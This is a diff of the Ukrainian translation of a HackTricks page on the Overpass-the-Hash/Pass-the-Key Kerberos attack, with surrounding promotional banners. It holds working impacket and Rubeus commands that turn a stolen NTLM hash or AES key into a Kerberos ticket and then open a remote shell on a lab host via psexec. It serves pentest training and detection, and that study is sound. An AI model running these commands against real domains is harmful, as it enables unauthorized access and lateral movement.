@@ -1,22 +1,30 @@
-# Пройдіть хеш/передайте ключ
+# Over Pass the Hash/Pass the Key
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Вивчіть хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Ви працюєте в **кібербезпецівій компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи телеграм**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Пройдіть хеш/передайте ключ (PTK)
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
-Атака **Пройдіть хеш/передайте ключ (PTK)** призначена для середовищ, де традиційний протокол NTLM обмежений, а аутентифікація Kerberos має пріоритет. Ця атака використовує хеш NTLM або ключі AES користувача для отримання квитків Kerberos, що дозволяє несанкціонований доступ до ресурсів у мережі.
+{% embed url="https://websec.nl/" %}
 
-Для виконання цієї атаки першим кроком є отримання хешу NTLM або пароля облікового запису цільового користувача. Після отримання цієї інформації можна отримати Квиток для надання квитків (TGT) для облікового запису, що дозволяє зловмиснику отримати доступ до служб або машин, до яких користувач має дозвіл.
+
+## Overpass The Hash/Pass The Key (PTK)
+
+Атака **Overpass The Hash/Pass The Key (PTK)** призначена для середовищ, де традиційний протокол NTLM обмежений, а аутентифікація Kerberos має перевагу. Ця атака використовує NTLM хеш або AES ключі користувача для отримання квитків Kerberos, що дозволяє несанкціонований доступ до ресурсів у мережі.
+
+Для виконання цієї атаки перший крок полягає в отриманні NTLM хешу або пароля цільового облікового запису користувача. Після отримання цієї інформації можна отримати Квиток на надання квитків (TGT) для облікового запису, що дозволяє зловмиснику отримати доступ до сервісів або машин, до яких має доступ користувач.
 
 Процес можна ініціювати за допомогою наступних команд:
 ```bash
@@ -24,33 +32,40 @@ python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2
 export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```
-Для сценаріїв, які вимагають AES256, можна використовувати опцію `-aesKey [AES key]`. Крім того, отриманий квиток можна використовувати з різними інструментами, включаючи smbexec.py або wmiexec.py, розширюючи обсяг атаки.
+Для сценаріїв, що вимагають AES256, можна використовувати опцію `-aesKey [AES key]`. Крім того, отриманий квиток може бути використаний з різними інструментами, включаючи smbexec.py або wmiexec.py, розширюючи обсяг атаки.
 
-Виявлені проблеми, такі як _PyAsn1Error_ або _KDC cannot find the name_, зазвичай вирішуються шляхом оновлення бібліотеки Impacket або використання імені хоста замість IP-адреси, що забезпечує сумісність з Kerberos KDC.
+Проблеми, такі як _PyAsn1Error_ або _KDC cannot find the name_, зазвичай вирішуються шляхом оновлення бібліотеки Impacket або використанням імені хоста замість IP-адреси, що забезпечує сумісність з Kerberos KDC.
 
-Альтернативна послідовність команд, використовуючи Rubeus.exe, демонструє ще один аспект цієї техніки:
+Альтернативна послідовність команд, що використовує Rubeus.exe, демонструє ще один аспект цієї техніки:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 ```
-Цей метод дублює підхід **Pass the Key**, з увагою на захоплення та використання квитка безпосередньо для аутентифікації. Важливо зауважити, що ініціація запиту TGT спричиняє подію `4768: Був запитаний квиток аутентифікації Kerberos (TGT)`, що свідчить про використання RC4-HMAC за замовчуванням, хоча сучасні системи Windows віддають перевагу AES256.
+Цей метод відображає підхід **Pass the Key**, зосереджуючись на захопленні та використанні квитка безпосередньо для цілей аутентифікації. Важливо зазначити, що ініціація запиту TGT викликає подію `4768: A Kerberos authentication ticket (TGT) was requested`, що означає використання RC4-HMAC за замовчуванням, хоча сучасні системи Windows віддають перевагу AES256.
 
-Для відповідності операційній безпеці та використання AES256 можна застосувати наступну команду:
+Щоб відповідати вимогам операційної безпеки та використовувати AES256, можна застосувати наступну команду:
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-## Посилання
+## References
 
 * [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+{% hint style="success" %}
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Підтримати HackTricks</summary>
 
-* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
-* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
-* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
-* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або групи [**telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
+{% endhint %}
